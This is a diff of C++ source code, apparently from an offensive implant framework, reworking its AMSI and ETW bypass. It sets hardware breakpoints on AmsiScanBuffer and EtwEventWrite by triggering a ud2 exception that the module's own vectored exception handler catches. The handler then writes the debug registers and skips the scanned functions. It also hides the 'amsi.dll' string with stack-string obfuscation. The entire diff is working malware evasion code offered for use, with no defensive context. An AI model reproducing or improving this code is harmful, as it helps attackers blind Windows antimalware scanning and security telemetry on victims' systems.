@@ -1,5 +1,6 @@
 #include <common.h>
 #include <module.h>
+#include <stackstr.h>
 
 #if defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)
 
@@ -7,23 +8,67 @@ using namespace stardust;
 
 namespace starburst {
 
+#define HWBP_SETUP_MAGIC 0x53424850ULL
+
 // ── VEH handler ──
-// Catches hardware breakpoint exceptions (EXCEPTION_SINGLE_STEP) fired by
-// debug registers DR0 (EtwEventWrite) and DR1 (AmsiScanBuffer).
-// Returns STATUS_SUCCESS / S_OK and skips the hooked function entirely.
-// No globals needed - hook addresses live in the debug registers themselves.
+// Two modes (fully PIC - no static data, all state via registers/CONTEXT):
+//   1) Setup: catches ud2 (EXCEPTION_ILLEGAL_INSTRUCTION) with magic in
+//      RSI/EAX. Reads target from RCX and DR index from RDX, sets DR
+//      registers via ContextRecord. ud2 is 2 bytes (0x0F 0x0B).
+//   2) Runtime: catches EXCEPTION_SINGLE_STEP from DR0/DR1 hits,
+//      returns 0 and skips the hooked function.
 
 static auto WINAPI declfn veh_hw_bp_handler(
     EXCEPTION_POINTERS* ep ) -> LONG
 {
+    auto ctx = ep->ContextRecord;
+
+#ifdef _WIN64
+    if ( ep->ExceptionRecord->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION
+         && ctx->Rsi == HWBP_SETUP_MAGIC ) {
+
+        auto target = ctx->Rcx;
+        auto dr_idx = static_cast<int>( ctx->Rdx );
+
+        switch ( dr_idx ) {
+            case 0: ctx->Dr0 = target; break;
+            case 1: ctx->Dr1 = target; break;
+            case 2: ctx->Dr2 = target; break;
+            case 3: ctx->Dr3 = target; break;
+        }
+
+        ctx->Dr7 |= ( 1ULL << ( dr_idx * 2 ) );
+        ctx->Rax = 1;
+        ctx->Rip += 2;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+#else
+    if ( ep->ExceptionRecord->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION
+         && ctx->Eax == static_cast<DWORD>( HWBP_SETUP_MAGIC ) ) {
+
+        auto target = ctx->Ecx;
+        auto dr_idx = static_cast<int>( ctx->Edx );
+
+        switch ( dr_idx ) {
+            case 0: ctx->Dr0 = target; break;
+            case 1: ctx->Dr1 = target; break;
+            case 2: ctx->Dr2 = target; break;
+            case 3: ctx->Dr3 = target; break;
+        }
+
+        ctx->Dr7 |= ( 1UL << ( dr_idx * 2 ) );
+        ctx->Eax = 1;
+        ctx->Eip += 2;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+#endif
+
     if ( ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP )
         return EXCEPTION_CONTINUE_SEARCH;
 
-    auto ctx  = ep->ContextRecord;
     auto addr = reinterpret_cast<uintptr_t>(
         ep->ExceptionRecord->ExceptionAddress );
 
-    // Check if the fault address matches DR0 (ETW) or DR1 (AMSI)
     if ( addr == ctx->Dr0 || addr == ctx->Dr1 ) {
 #ifdef _WIN64
         ctx->Rax = 0;
@@ -46,12 +91,8 @@ static auto declfn ensure_veh_installed( instance& inst ) -> bool {
 #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
     if ( inst.evasion.amsi_veh )
         return true;
-#else
-    // No amsi_veh field available - track via etw_patched as a proxy
-    // (VEH is idempotent; worst case we register twice which is harmless)
 #endif
 
-    // Resolve RtlAddVectoredExceptionHandler from ntdll
     auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
         resolve::_api( inst.ntdll.handle,
             expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
@@ -70,54 +111,38 @@ static auto declfn ensure_veh_installed( instance& inst ) -> bool {
     return true;
 }
 
-// ── Set a hardware breakpoint on a given debug register ──
-// dr_index: 0 = DR0 (ETW), 1 = DR1 (AMSI)
+// ── Set a hardware breakpoint via exception-based DR install ──
+// Fires ud2 (0x0F 0x0B) with target in RCX, DR index in RDX, magic in RSI.
+// VEH handler catches EXCEPTION_ILLEGAL_INSTRUCTION, sets DR registers via
+// ContextRecord, advances RIP by 2. Fully PIC - no static data.
 
 static auto declfn set_hw_breakpoint(
     instance& inst,
     void*     target_addr,
     int       dr_index ) -> bool
 {
-    // Resolve NtGetContextThread / NtSetContextThread from ntdll
-    auto pNtGetCtx = reinterpret_cast<decltype(NtGetContextThread)*>(
-        resolve::_api( inst.ntdll.handle,
-            expr::hash_string( "NtGetContextThread" ) ) );
-
-    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
-        resolve::_api( inst.ntdll.handle,
-            expr::hash_string( "NtSetContextThread" ) ) );
-
-    if ( !pNtGetCtx || !pNtSetCtx ) return false;
-
-    // Use pseudo-handle -1 for current thread (NtCurrentThread)
-    HANDLE hThread = reinterpret_cast<HANDLE>( static_cast<uintptr_t>( -2 ) );
-
-    CONTEXT ctx   = {};
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-    if ( pNtGetCtx( hThread, &ctx ) != 0 )
-        return false;
-
 #ifdef _WIN64
-    auto addr = reinterpret_cast<DWORD64>( target_addr );
+    uintptr_t result = 0;
+    __asm__ volatile (
+        "ud2"
+        : "=a" ( result )
+        : "c" ( reinterpret_cast<uintptr_t>( target_addr ) ),
+          "d" ( static_cast<uintptr_t>( dr_index ) ),
+          "S" ( static_cast<uintptr_t>( HWBP_SETUP_MAGIC ) )
+        : "memory"
+    );
+    return result != 0;
 #else
-    auto addr = reinterpret_cast<DWORD>( target_addr );
+    uintptr_t result = static_cast<uintptr_t>( HWBP_SETUP_MAGIC );
+    __asm__ volatile (
+        "ud2"
+        : "+a" ( result )
+        : "c" ( reinterpret_cast<uintptr_t>( target_addr ) ),
+          "d" ( static_cast<uintptr_t>( dr_index ) )
+        : "memory"
+    );
+    return result != 0;
 #endif
-
-    switch ( dr_index ) {
-        case 0: ctx.Dr0 = addr; break;
-        case 1: ctx.Dr1 = addr; break;
-        case 2: ctx.Dr2 = addr; break;
-        case 3: ctx.Dr3 = addr; break;
-        default: return false;
-    }
-
-    ctx.Dr7 |= ( static_cast<decltype(ctx.Dr7)>(1) << ( dr_index * 2 ) );
-
-    if ( pNtSetCtx( hThread, &ctx ) != 0 )
-        return false;
-
-    return true;
 }
 
 #ifdef INCLUDE_EVASION_ETW
@@ -140,8 +165,8 @@ static auto declfn patch_etw( instance& inst ) -> bool {
 
 #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
 static auto declfn patch_amsi( instance& inst ) -> bool {
-    auto h_amsi = inst.kernel32.LoadLibraryA(
-        symbol<const char*>( "amsi.dll" ) );
+    STK_AMSI(_n);
+    auto h_amsi = inst.kernel32.LoadLibraryA( _n );
     if ( !h_amsi ) return false;
 
     auto pAmsiScanBuffer = reinterpret_cast<void*>(
